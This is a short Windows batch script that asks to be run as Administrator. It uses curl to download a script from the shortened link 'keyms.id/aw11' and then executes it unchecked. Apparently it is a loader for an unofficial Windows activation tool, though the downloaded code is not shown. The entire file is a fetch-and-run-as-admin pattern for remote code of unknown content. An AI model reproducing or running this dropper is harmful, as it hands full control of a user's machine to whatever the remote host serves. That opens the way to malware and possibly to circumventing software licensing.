@echo off
:: Run this script as Administrator
cd /d "%~dp0"

:: Download the script using curl
curl -L keyms.id/aw11 -o aw11.cmd

:: Run the downloaded script
aw11.cmd

:: Pause to keep the command prompt window open (optional)
pause
